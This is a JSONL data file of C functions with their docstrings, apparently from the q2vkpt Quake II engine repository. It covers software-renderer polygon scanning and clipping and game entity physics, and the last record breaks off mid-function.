{"docstring": "/*\n**\n** R_PolygonScanLeftEdge\n**\n** Goes through the polygon and scans the left edge, filling in\n** screen coordinate data for the spans\n*/\n", "func_signal": "static void R_PolygonScanLeftEdge(void)", "code": "{\n    int         i, v, itop, ibottom, lmaxindex;\n    emitpoint_t *pvert, *pnext;\n    espan_t     *pspan;\n    float       du, dv, vtop, vbottom, slope;\n    fixed16_t   u, u_step;\n\n    pspan = s_polygon_spans;\n    i = s_minindex;\n    if (i == 0)\n        i = r_polydesc.nump;\n\n    lmaxindex = s_maxindex;\n    if (lmaxindex == 0)\n        lmaxindex = r_polydesc.nump;\n\n    vtop = ceil(r_polydesc.pverts[i].v);\n\n    do {\n        pvert = &r_polydesc.pverts[i];\n        pnext = pvert - 1;\n\n        vbottom = ceil(pnext->v);\n\n        if (vtop < vbottom) {\n            du = pnext->u - pvert->u;\n            dv = pnext->v - pvert->v;\n\n            slope = du / dv;\n            u_step = (int)(slope * 0x10000);\n            // adjust u to ceil the integer portion\n            u = (int)((pvert->u + (slope * (vtop - pvert->v))) * 0x10000) +\n                (0x10000 - 1);\n            itop = (int)vtop;\n            ibottom = (int)vbottom;\n\n            for (v = itop; v < ibottom; v++) {\n                pspan->u = u >> 16;\n                pspan->v = v;\n                u += u_step;\n                pspan++;\n            }\n        }\n\n        vtop = vbottom;\n\n        i--;\n        if (i == 0)\n            i = r_polydesc.nump;\n\n    } while (i != lmaxindex);\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n** R_PolygonScanRightEdge\n**\n** Goes through the polygon and scans the right edge, filling in\n** count values.\n*/\n", "func_signal": "static void R_PolygonScanRightEdge(void)", "code": "{\n    int         i, v, itop, ibottom;\n    emitpoint_t *pvert, *pnext;\n    espan_t     *pspan;\n    float       du, dv, vtop, vbottom, slope, uvert, unext, vvert, vnext;\n    fixed16_t   u, u_step;\n\n    pspan = s_polygon_spans;\n    i = s_minindex;\n\n    vvert = r_polydesc.pverts[i].v;\n    if (vvert < r_refdef.fvrecty_adj)\n        vvert = r_refdef.fvrecty_adj;\n    if (vvert > r_refdef.fvrectbottom_adj)\n        vvert = r_refdef.fvrectbottom_adj;\n\n    vtop = ceil(vvert);\n\n    do {\n        pvert = &r_polydesc.pverts[i];\n        pnext = pvert + 1;\n\n        vnext = pnext->v;\n        if (vnext < r_refdef.fvrecty_adj)\n            vnext = r_refdef.fvrecty_adj;\n        if (vnext > r_refdef.fvrectbottom_adj)\n            vnext = r_refdef.fvrectbottom_adj;\n\n        vbottom = ceil(vnext);\n\n        if (vtop < vbottom) {\n            uvert = pvert->u;\n            if (uvert < r_refdef.fvrectx_adj)\n                uvert = r_refdef.fvrectx_adj;\n            if (uvert > r_refdef.fvrectright_adj)\n                uvert = r_refdef.fvrectright_adj;\n\n            unext = pnext->u;\n            if (unext < r_refdef.fvrectx_adj)\n                unext = r_refdef.fvrectx_adj;\n            if (unext > r_refdef.fvrectright_adj)\n                unext = r_refdef.fvrectright_adj;\n\n            du = unext - uvert;\n            dv = vnext - vvert;\n            slope = du / dv;\n            u_step = (int)(slope * 0x10000);\n            // adjust u to ceil the integer portion\n            u = (int)((uvert + (slope * (vtop - vvert))) * 0x10000) +\n                (0x10000 - 1);\n            itop = (int)vtop;\n            ibottom = (int)vbottom;\n\n            for (v = itop; v < ibottom; v++) {\n                pspan->count = (u >> 16) - pspan->u;\n                u += u_step;\n                pspan++;\n            }\n        }\n\n        vtop = vbottom;\n        vvert = vnext;\n\n        i++;\n        if (i == r_polydesc.nump)\n            i = 0;\n\n    } while (i != s_maxindex);\n\n    pspan->count = DS_SPAN_LIST_END;    // mark the end of the span list\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n** R_DrawPoly\n**\n** Polygon drawing function.  Uses the polygon described in r_polydesc\n** to calculate edges and gradients, then renders the resultant spans.\n**\n** This should NOT be called externally since it doesn't do clipping!\n*/\n", "func_signal": "static void R_DrawPoly(int iswater)", "code": "{\n    int         i, nump;\n    float       ymin, ymax;\n    emitpoint_t *pverts;\n    espan_t spans[MAXHEIGHT + 1];\n\n    s_polygon_spans = spans;\n\n// find the top and bottom vertices, and make sure there's at least one scan to\n// draw\n    ymin = 999999.9;\n    ymax = -999999.9;\n    pverts = r_polydesc.pverts;\n\n    for (i = 0; i < r_polydesc.nump; i++) {\n        if (pverts->v < ymin) {\n            ymin = pverts->v;\n            s_minindex = i;\n        }\n\n        if (pverts->v > ymax) {\n            ymax = pverts->v;\n            s_maxindex = i;\n        }\n\n        pverts++;\n    }\n\n    ymin = ceil(ymin);\n    ymax = ceil(ymax);\n\n    if (ymin >= ymax)\n        return;     // doesn't cross any scans at all\n\n    cachewidth = r_polydesc.pixel_width * TEX_BYTES;\n    cacheblock = r_polydesc.pixels;\n\n// copy the first vertex to the last vertex, so we don't have to deal with\n// wrapping\n    nump = r_polydesc.nump;\n    pverts = r_polydesc.pverts;\n    pverts[nump] = pverts[0];\n\n    R_PolygonCalculateGradients();\n    R_PolygonScanLeftEdge();\n    R_PolygonScanRightEdge();\n\n    R_PolygonDrawSpans(s_polygon_spans, iswater);\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n================\nSV_CheckVelocity\n================\n*/\n", "func_signal": "void SV_CheckVelocity(edict_t *ent)", "code": "{\n    int     i;\n\n//\n// bound velocity\n//\n    for (i = 0 ; i < 3 ; i++) {\n        if (ent->velocity[i] > sv_maxvelocity->value)\n            ent->velocity[i] = sv_maxvelocity->value;\n        else if (ent->velocity[i] < -sv_maxvelocity->value)\n            ent->velocity[i] = -sv_maxvelocity->value;\n    }\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n** R_BuildPolygonFromSurface\n*/\n", "func_signal": "static void R_BuildPolygonFromSurface(mface_t *fa)", "code": "{\n    int         i, lnumverts;\n    msurfedge_t *surfedge;\n    float       *vec;\n    vec5_t      *pverts;\n    float       tmins[2] = { 0, 0 };\n\n    r_polydesc.nump = 0;\n\n    // reconstruct the polygon\n    lnumverts = fa->numsurfedges;\n\n    if (lnumverts > MAXWORKINGVERTS)\n        Com_Error(ERR_DROP, \"R_BuildPolygonFromSurface: too many points: %d\", lnumverts);\n\n    pverts = r_clip_verts[0];\n\n    surfedge = fa->firstsurfedge;\n    for (i = 0; i < lnumverts; i++, surfedge++) {\n        vec = surfedge->edge->v[surfedge->vert]->point;\n        VectorCopy(vec, pverts[i]);\n    }\n\n    VectorCopy(fa->texinfo->axis[0], r_polydesc.vright);\n    VectorCopy(fa->texinfo->axis[1], r_polydesc.vup);\n    VectorCopy(fa->plane->normal, r_polydesc.vpn);\n    VectorCopy(r_origin, r_polydesc.viewer_position);\n\n    if (fa->drawflags & DSURF_PLANEBACK) {\n        VectorInverse(r_polydesc.vpn);\n    }\n\n    if (fa->texinfo->c.flags & (SURF_WARP | SURF_FLOWING)) {\n        r_polydesc.pixels       = fa->texinfo->image->pixels[0];\n        r_polydesc.pixel_width  = fa->texinfo->image->upload_width;\n        r_polydesc.pixel_height = fa->texinfo->image->upload_height;\n    } else {\n        surfcache_t *scache;\n\n        scache = D_CacheSurface(fa, 0);\n\n        r_polydesc.pixels       = scache->data;\n        r_polydesc.pixel_width  = scache->width;\n        r_polydesc.pixel_height = scache->height;\n\n        tmins[0] = fa->texturemins[0];\n        tmins[1] = fa->texturemins[1];\n    }\n\n    r_polydesc.dist = DotProduct(r_polydesc.vpn, pverts[0]);\n\n    r_polydesc.s_offset = fa->texinfo->offset[0] - tmins[0];\n    r_polydesc.t_offset = fa->texinfo->offset[1] - tmins[1];\n\n    // scrolling texture addition\n    if (fa->texinfo->c.flags & SURF_FLOWING) {\n        r_polydesc.s_offset += -128 * ((r_newrefdef.time * 0.25) - (int)(r_newrefdef.time * 0.25));\n    }\n\n    r_polydesc.nump = lnumverts;\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n** R_DrawAlphaSurfaces\n*/\n", "func_signal": "void R_DrawAlphaSurfaces(void)", "code": "{\n    mface_t *s = r_alpha_surfaces;\n\n    //currentmodel = r_worldmodel;\n\n    modelorg[0] = -r_origin[0];\n    modelorg[1] = -r_origin[1];\n    modelorg[2] = -r_origin[2];\n\n    while (s) {\n        R_BuildPolygonFromSurface(s);\n\n        if (s->texinfo->c.flags & SURF_TRANS66)\n            R_ClipAndDrawPoly(0.66f, (s->texinfo->c.flags & (SURF_WARP | SURF_FLOWING)), qtrue);\n        else\n            R_ClipAndDrawPoly(0.33f, (s->texinfo->c.flags & (SURF_WARP | SURF_FLOWING)), qtrue);\n\n        s = s->next;\n    }\n\n    r_alpha_surfaces = NULL;\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n** R_ClipPolyFace\n**\n** Clips the winding at clip_verts[clip_current] and changes clip_current\n** Throws out the back side\n*/\n", "func_signal": "static int R_ClipPolyFace(int nump, clipplane_t *pclipplane)", "code": "{\n    int     i, outcount;\n    float   dists[MAXWORKINGVERTS + 3];\n    float   frac, clipdist, *pclipnormal;\n    float   *in, *instep, *outstep, *vert2;\n\n    clipdist = pclipplane->dist;\n    pclipnormal = pclipplane->normal;\n\n// calc dists\n    if (clip_current) {\n        in = r_clip_verts[1][0];\n        outstep = r_clip_verts[0][0];\n        clip_current = 0;\n    } else {\n        in = r_clip_verts[0][0];\n        outstep = r_clip_verts[1][0];\n        clip_current = 1;\n    }\n\n    instep = in;\n    for (i = 0; i < nump; i++, instep += sizeof(vec5_t) / sizeof(float)) {\n        dists[i] = DotProduct(instep, pclipnormal) - clipdist;\n    }\n\n// handle wraparound case\n    dists[nump] = dists[0];\n    memcpy(instep, in, sizeof(vec5_t));\n\n\n// clip the winding\n    instep = in;\n    outcount = 0;\n\n    for (i = 0; i < nump; i++, instep += sizeof(vec5_t) / sizeof(float)) {\n        if (dists[i] >= 0) {\n            memcpy(outstep, instep, sizeof(vec5_t));\n            outstep += sizeof(vec5_t) / sizeof(float);\n            outcount++;\n        }\n\n        if (dists[i] == 0 || dists[i + 1] == 0)\n            continue;\n\n        if ((dists[i] > 0) == (dists[i + 1] > 0))\n            continue;\n\n        // split it into a new vertex\n        frac = dists[i] / (dists[i] - dists[i + 1]);\n\n        vert2 = instep + sizeof(vec5_t) / sizeof(float);\n\n        outstep[0] = instep[0] + frac * (vert2[0] - instep[0]);\n        outstep[1] = instep[1] + frac * (vert2[1] - instep[1]);\n        outstep[2] = instep[2] + frac * (vert2[2] - instep[2]);\n        outstep[3] = instep[3] + frac * (vert2[3] - instep[3]);\n        outstep[4] = instep[4] + frac * (vert2[4] - instep[4]);\n\n        outstep += sizeof(vec5_t) / sizeof(float);\n        outcount++;\n    }\n\n    return outcount;\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n==================\nSV_Impact\n\nTwo entities have touched, so run their touch functions\n==================\n*/\n", "func_signal": "void SV_Impact(edict_t *e1, trace_t *trace)", "code": "{\n    edict_t     *e2;\n//  cplane_t    backplane;\n\n    e2 = trace->ent;\n\n    if (e1->touch && e1->solid != SOLID_NOT)\n        e1->touch(e1, e2, &trace->plane, trace->surface);\n\n    if (e2->touch && e2->solid != SOLID_NOT)\n        e2->touch(e2, e1, NULL, NULL);\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n============\nSV_Push\n\nObjects need to be moved back on a failed push,\notherwise riders would continue to slide.\n============\n*/\n", "func_signal": "qboolean SV_Push(edict_t *pusher, vec3_t move, vec3_t amove)", "code": "{\n    int         i, e;\n    edict_t     *check, *block;\n    vec3_t      mins, maxs;\n    pushed_t    *p;\n    vec3_t      org, org2, move2, forward, right, up;\n\n    // clamp the move to 1/8 units, so the position will\n    // be accurate for client side prediction\n    for (i = 0 ; i < 3 ; i++) {\n        float   temp;\n        temp = move[i] * 8.0;\n        if (temp > 0.0)\n            temp += 0.5;\n        else\n            temp -= 0.5;\n        move[i] = 0.125 * (int)temp;\n    }\n\n    // find the bounding box\n    for (i = 0 ; i < 3 ; i++) {\n        mins[i] = pusher->absmin[i] + move[i];\n        maxs[i] = pusher->absmax[i] + move[i];\n    }\n\n// we need this for pushing things later\n    VectorSubtract(vec3_origin, amove, org);\n    AngleVectors(org, forward, right, up);\n\n// save the pusher's original position\n    pushed_p->ent = pusher;\n    VectorCopy(pusher->s.origin, pushed_p->origin);\n    VectorCopy(pusher->s.angles, pushed_p->angles);\n#if USE_SMOOTH_DELTA_ANGLES\n    if (pusher->client)\n        pushed_p->deltayaw = pusher->client->ps.pmove.delta_angles[YAW];\n#endif\n    pushed_p++;\n\n// move the pusher to it's final position\n    VectorAdd(pusher->s.origin, move, pusher->s.origin);\n    VectorAdd(pusher->s.angles, amove, pusher->s.angles);\n    gi.linkentity(pusher);\n\n// see if any solid entities are inside the final position\n    check = g_edicts + 1;\n    for (e = 1; e < globals.num_edicts; e++, check++) {\n        if (!check->inuse)\n            continue;\n        if (check->movetype == MOVETYPE_PUSH\n            || check->movetype == MOVETYPE_STOP\n            || check->movetype == MOVETYPE_NONE\n            || check->movetype == MOVETYPE_NOCLIP)\n            continue;\n\n        if (!check->area.prev)\n            continue;       // not linked in anywhere\n\n        // if the entity is standing on the pusher, it will definitely be moved\n        if (check->groundentity != pusher) {\n            // see if the ent needs to be tested\n            if (check->absmin[0] >= maxs[0]\n                || check->absmin[1] >= maxs[1]\n                || check->absmin[2] >= maxs[2]\n                || check->absmax[0] <= mins[0]\n                || check->absmax[1] <= mins[1]\n                || check->absmax[2] <= mins[2])\n                continue;\n\n            // see if the ent's bbox is inside the pusher's final position\n            if (!SV_TestEntityPosition(check))\n                continue;\n        }\n\n        if ((pusher->movetype == MOVETYPE_PUSH) || (check->groundentity == pusher)) {\n            // move this entity\n            pushed_p->ent = check;\n            VectorCopy(check->s.origin, pushed_p->origin);\n            VectorCopy(check->s.angles, pushed_p->angles);\n#if USE_SMOOTH_DELTA_ANGLES\n            if (check->client)\n                pushed_p->deltayaw = check->client->ps.pmove.delta_angles[YAW];\n#endif\n            pushed_p++;\n\n            // try moving the contacted entity\n            VectorAdd(check->s.origin, move, check->s.origin);\n#if USE_SMOOTH_DELTA_ANGLES\n            if (check->client) {\n                // FIXME: doesn't rotate monsters?\n                // FIXME: skuller: needs client side interpolation\n                check->client->ps.pmove.delta_angles[YAW] += ANGLE2SHORT(amove[YAW]);\n            }\n#endif\n\n            // figure movement due to the pusher's amove\n            VectorSubtract(check->s.origin, pusher->s.origin, org);\n            org2[0] = DotProduct(org, forward);\n            org2[1] = -DotProduct(org, right);\n            org2[2] = DotProduct(org, up);\n            VectorSubtract(org2, org, move2);\n            VectorAdd(check->s.origin, move2, check->s.origin);\n\n            // may have pushed them off an edge\n            if (check->groundentity != pusher)\n                check->groundentity = NULL;\n\n            block = SV_TestEntityPosition(check);\n            if (!block) {\n                // pushed ok\n                gi.linkentity(check);\n                // impact?\n                continue;\n            }\n\n            // if it is ok to leave in the old position, do it\n            // this is only relevent for riding entities, not pushed\n            // FIXME: this doesn't acount for rotation\n            VectorSubtract(check->s.origin, move, check->s.origin);\n            block = SV_TestEntityPosition(check);\n            if (!block) {\n                pushed_p--;\n                continue;\n            }\n        }\n\n        // save off the obstacle so we can call the block function\n        obstacle = check;\n\n        // move back any entities we already moved\n        // go backwards, so if the same entity was pushed\n        // twice, it goes back to the original position\n        for (p = pushed_p - 1 ; p >= pushed ; p--) {\n            VectorCopy(p->origin, p->ent->s.origin);\n            VectorCopy(p->angles, p->ent->s.angles);\n#if USE_SMOOTH_DELTA_ANGLES\n            if (p->ent->client) {\n                p->ent->client->ps.pmove.delta_angles[YAW] = p->deltayaw;\n            }\n#endif\n            gi.linkentity(p->ent);\n        }\n        return qfalse;\n    }\n\n//FIXME: is there a better way to handle this?\n    // see if anything we moved has touched a trigger\n    for (p = pushed_p - 1 ; p >= pushed ; p--)\n        G_TouchTriggers(p->ent);\n\n    return qtrue;\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n================\nSV_Physics_Pusher\n\nBmodel objects don't interact with each other, but\npush all box objects\n================\n*/\n", "func_signal": "void SV_Physics_Pusher(edict_t *ent)", "code": "{\n    vec3_t      move, amove;\n    edict_t     *part, *mv;\n\n    // if not a team captain, so movement will be handled elsewhere\n    if (ent->flags & FL_TEAMSLAVE)\n        return;\n\n    // make sure all team slaves can move before commiting\n    // any moves or calling any think functions\n    // if the move is blocked, all moved objects will be backed out\n//retry:\n    pushed_p = pushed;\n    for (part = ent ; part ; part = part->teamchain) {\n        if (part->velocity[0] || part->velocity[1] || part->velocity[2] ||\n            part->avelocity[0] || part->avelocity[1] || part->avelocity[2]\n           ) {\n            // object is moving\n            VectorScale(part->velocity, FRAMETIME, move);\n            VectorScale(part->avelocity, FRAMETIME, amove);\n\n            if (!SV_Push(part, move, amove))\n                break;  // move was blocked\n        }\n    }\n    if (pushed_p > &pushed[MAX_EDICTS])\n        gi.error(\"pushed_p > &pushed[MAX_EDICTS], memory corrupted\");\n\n    if (part) {\n        // the move failed, bump all nextthink times and back out moves\n        for (mv = ent ; mv ; mv = mv->teamchain) {\n            if (mv->nextthink > 0)\n                mv->nextthink += FRAMETIME;\n        }\n\n        // if the pusher has a \"blocked\" function, call it\n        // otherwise, just stay in place until the obstacle is gone\n        if (part->blocked)\n            part->blocked(part, obstacle);\n#if 0\n        // if the pushed entity went away and the pusher is still there\n        if (!obstacle->inuse && part->inuse)\n            goto retry;\n#endif\n    } else {\n        // the move succeeded, so call all think functions\n        for (part = ent ; part ; part = part->teamchain) {\n            SV_RunThink(part);\n        }\n    }\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n============\nSV_TestEntityPosition\n\n============\n*/\n", "func_signal": "edict_t *SV_TestEntityPosition(edict_t *ent)", "code": "{\n    trace_t trace;\n    int     mask;\n\n    if (ent->clipmask)\n        mask = ent->clipmask;\n    else\n        mask = MASK_SOLID;\n    trace = gi.trace(ent->s.origin, ent->mins, ent->maxs, ent->s.origin, ent, mask);\n\n    if (trace.startsolid)\n        return g_edicts;\n\n    return NULL;\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n=============\nSV_Physics_Toss\n\nToss, bounce, and fly movement.  When onground, do nothing.\n=============\n*/\n", "func_signal": "void SV_Physics_Toss(edict_t *ent)", "code": "{\n    trace_t     trace;\n    vec3_t      move;\n    float       backoff;\n    edict_t     *slave;\n    qboolean    wasinwater;\n    qboolean    isinwater;\n    vec3_t      old_origin;\n\n// regular thinking\n    SV_RunThink(ent);\n    if (!ent->inuse)\n        return;\n\n    // if not a team captain, so movement will be handled elsewhere\n    if (ent->flags & FL_TEAMSLAVE)\n        return;\n\n    if (ent->velocity[2] > 0)\n        ent->groundentity = NULL;\n\n// check for the groundentity going away\n    if (ent->groundentity)\n        if (!ent->groundentity->inuse)\n            ent->groundentity = NULL;\n\n// if onground, return without moving\n    if (ent->groundentity)\n        return;\n\n    VectorCopy(ent->s.origin, old_origin);\n\n    SV_CheckVelocity(ent);\n\n// add gravity\n    if (ent->movetype != MOVETYPE_FLY\n        && ent->movetype != MOVETYPE_FLYMISSILE)\n        SV_AddGravity(ent);\n\n// move angles\n    VectorMA(ent->s.angles, FRAMETIME, ent->avelocity, ent->s.angles);\n\n// move origin\n    VectorScale(ent->velocity, FRAMETIME, move);\n    trace = SV_PushEntity(ent, move);\n    if (!ent->inuse)\n        return;\n\n    if (trace.fraction < 1) {\n        if (ent->movetype == MOVETYPE_BOUNCE)\n            backoff = 1.5;\n        else\n            backoff = 1;\n\n        ClipVelocity(ent->velocity, trace.plane.normal, ent->velocity, backoff);\n\n        // stop if on ground\n        if (trace.plane.normal[2] > 0.7) {\n            if (ent->velocity[2] < 60 || ent->movetype != MOVETYPE_BOUNCE) {\n                ent->groundentity = trace.ent;\n                ent->groundentity_linkcount = trace.ent->linkcount;\n                VectorCopy(vec3_origin, ent->velocity);\n                VectorCopy(vec3_origin, ent->avelocity);\n            }\n        }\n\n//      if (ent->touch)\n//          ent->touch (ent, trace.ent, &trace.plane, trace.surface);\n    }\n\n// check for water transition\n    wasinwater = (ent->watertype & MASK_WATER);\n    ent->watertype = gi.pointcontents(ent->s.origin);\n    isinwater = ent->watertype & MASK_WATER;\n\n    if (isinwater)\n        ent->waterlevel = 1;\n    else\n        ent->waterlevel = 0;\n\n    if (!wasinwater && isinwater)\n        gi.positioned_sound(old_origin, g_edicts, CHAN_AUTO, gi.soundindex(\"misc/h2ohit1.wav\"), 1, 1, 0);\n    else if (wasinwater && !isinwater)\n        gi.positioned_sound(ent->s.origin, g_edicts, CHAN_AUTO, gi.soundindex(\"misc/h2ohit1.wav\"), 1, 1, 0);\n\n// move teamslaves\n    for (slave = ent->teamchain; slave; slave = slave->teamchain) {\n        VectorCopy(ent->s.origin, slave->s.origin);\n        gi.linkentity(slave);\n    }\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n** R_ClipAndDrawPoly\n*/\n", "func_signal": "static void R_ClipAndDrawPoly(float alpha, int isturbulent, int textured)", "code": "{\n    emitpoint_t outverts[MAXWORKINGVERTS + 3], *pout;\n    float       *pv;\n    int         i, nump;\n    float       scale;\n    vec3_t      transformed, local;\n\n    r_polydesc.alpha = 255 * alpha;\n    r_polydesc.one_minus_alpha = 255 - r_polydesc.alpha;\n\n    if (textured == 0) {\n        r_polydesc.drawspanlet = R_DrawSpanletConstantBlended;\n    } else if (textured == 2) {\n        r_polydesc.drawspanlet = R_DrawSpanletAlphaTestBlended;\n    } else if (alpha == 1) {\n        // isturbulent is ignored because we know that turbulent surfaces\n        // can't be opaque\n        r_polydesc.drawspanlet = R_DrawSpanletOpaque;\n    } else if (isturbulent) {\n        r_polydesc.drawspanlet = R_DrawSpanletTurbulentBlended;\n    } else {\n        r_polydesc.drawspanlet = R_DrawSpanletBlended;\n    }\n\n    // clip to the frustum in worldspace\n    nump = r_polydesc.nump;\n    clip_current = 0;\n\n    for (i = 0; i < 4; i++) {\n        nump = R_ClipPolyFace(nump, &view_clipplanes[i]);\n        if (nump < 3)\n            return;\n        if (nump > MAXWORKINGVERTS)\n            Com_Error(ERR_DROP, \"R_ClipAndDrawPoly: too many points: %d\", nump);\n    }\n\n// transform vertices into viewspace and project\n    pv = &r_clip_verts[clip_current][0][0];\n\n    for (i = 0; i < nump; i++) {\n        VectorSubtract(pv, r_origin, local);\n        R_TransformVector(local, transformed);\n\n        if (transformed[2] < NEAR_CLIP)\n            transformed[2] = NEAR_CLIP;\n\n        pout = &outverts[i];\n        pout->zi = 1.0 / transformed[2];\n\n        pout->s = pv[3];\n        pout->t = pv[4];\n\n        scale = r_refdef.xscale * pout->zi;\n        pout->u = (r_refdef.xcenter + scale * transformed[0]);\n\n        scale = r_refdef.yscale * pout->zi;\n        pout->v = (r_refdef.ycenter - scale * transformed[1]);\n\n        pv += sizeof(vec5_t) / sizeof(vec_t);\n    }\n\n// draw it\n    r_polydesc.nump = nump;\n    r_polydesc.pverts = outverts;\n\n    R_DrawPoly(isturbulent);\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n** R_IMFlatShadedQuad\n*/\n", "func_signal": "void R_IMFlatShadedQuad(vec3_t a, vec3_t b, vec3_t c, vec3_t d, color_t color, float alpha)", "code": "{\n    vec3_t s0, s1;\n\n    r_polydesc.nump = 4;\n    VectorCopy(r_origin, r_polydesc.viewer_position);\n\n    VectorCopy(a, r_clip_verts[0][0]);\n    VectorCopy(b, r_clip_verts[0][1]);\n    VectorCopy(c, r_clip_verts[0][2]);\n    VectorCopy(d, r_clip_verts[0][3]);\n\n    r_clip_verts[0][0][3] = 0;\n    r_clip_verts[0][1][3] = 0;\n    r_clip_verts[0][2][3] = 0;\n    r_clip_verts[0][3][3] = 0;\n\n    r_clip_verts[0][0][4] = 0;\n    r_clip_verts[0][1][4] = 0;\n    r_clip_verts[0][2][4] = 0;\n    r_clip_verts[0][3][4] = 0;\n\n    VectorSubtract(d, c, s0);\n    VectorSubtract(c, b, s1);\n    CrossProduct(s0, s1, r_polydesc.vpn);\n    VectorNormalize(r_polydesc.vpn);\n\n    r_polydesc.dist = DotProduct(r_polydesc.vpn, r_clip_verts[0][0]);\n\n    r_polydesc.alpha = 255 * alpha;\n\n    r_polyblendcolor[0] = color.u8[0] * r_polydesc.alpha;\n    r_polyblendcolor[1] = color.u8[1] * r_polydesc.alpha;\n    r_polyblendcolor[2] = color.u8[2] * r_polydesc.alpha;\n\n    R_ClipAndDrawPoly(alpha, qfalse, qfalse);\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n============\nSV_PushEntity\n\nDoes not change the entities velocity at all\n============\n*/\n", "func_signal": "trace_t SV_PushEntity(edict_t *ent, vec3_t push)", "code": "{\n    trace_t trace;\n    vec3_t  start;\n    vec3_t  end;\n    int     mask;\n\n    VectorCopy(ent->s.origin, start);\n    VectorAdd(start, push, end);\n\nretry:\n    if (ent->clipmask)\n        mask = ent->clipmask;\n    else\n        mask = MASK_SOLID;\n\n    trace = gi.trace(start, ent->mins, ent->maxs, end, ent, mask);\n\n    VectorCopy(trace.endpos, ent->s.origin);\n    gi.linkentity(ent);\n\n    if (trace.fraction != 1.0) {\n        SV_Impact(ent, &trace);\n\n        // if the pushed entity went away and the pusher is still there\n        if (!trace.ent->inuse && ent->inuse) {\n            // move the pusher back and try again\n            VectorCopy(start, ent->s.origin);\n            gi.linkentity(ent);\n            goto retry;\n        }\n    }\n\n    if (ent->inuse)\n        G_TouchTriggers(ent);\n\n    return trace;\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n=============\nSV_Physics_Noclip\n\nA moving object that doesn't obey physics\n=============\n*/\n", "func_signal": "void SV_Physics_Noclip(edict_t *ent)", "code": "{\n// regular thinking\n    if (!SV_RunThink(ent))\n        return;\n    if (!ent->inuse)\n        return;\n\n    VectorMA(ent->s.angles, FRAMETIME, ent->avelocity, ent->s.angles);\n    VectorMA(ent->s.origin, FRAMETIME, ent->velocity, ent->s.origin);\n\n    gi.linkentity(ent);\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n** R_DrawSprite\n**\n** Draw currententity / currentmodel as a single texture\n** mapped polygon\n*/\n", "func_signal": "void R_DrawSprite(void)", "code": "{\n    vec5_t      *pverts;\n    vec3_t      left, up, right, down;\n    mspriteframe_t  *frame;\n    int             textured;\n\n    frame = &currentmodel->spriteframes[\n                currententity->frame % currentmodel->numframes];\n\n    r_polydesc.pixels       = frame->image->pixels[0];\n    r_polydesc.pixel_width  = frame->image->upload_width;\n    r_polydesc.pixel_height = frame->image->upload_height;\n    r_polydesc.dist         = 0;\n\n    // generate the sprite's axes, completely parallel to the viewplane.\n    VectorCopy(vup, r_polydesc.vup);\n    VectorCopy(vright, r_polydesc.vright);\n    VectorCopy(vpn, r_polydesc.vpn);\n\n// build the sprite poster in worldspace\n    VectorScale(r_polydesc.vright,\n                frame->width - frame->origin_x, right);\n    VectorScale(r_polydesc.vup,\n                frame->height - frame->origin_y, up);\n    VectorScale(r_polydesc.vright,\n                -frame->origin_x, left);\n    VectorScale(r_polydesc.vup,\n                -frame->origin_y, down);\n\n    // invert UP vector for sprites\n    VectorNegate(r_polydesc.vup, r_polydesc.vup);\n\n    pverts = r_clip_verts[0];\n\n    pverts[0][0] = r_entorigin[0] + up[0] + left[0];\n    pverts[0][1] = r_entorigin[1] + up[1] + 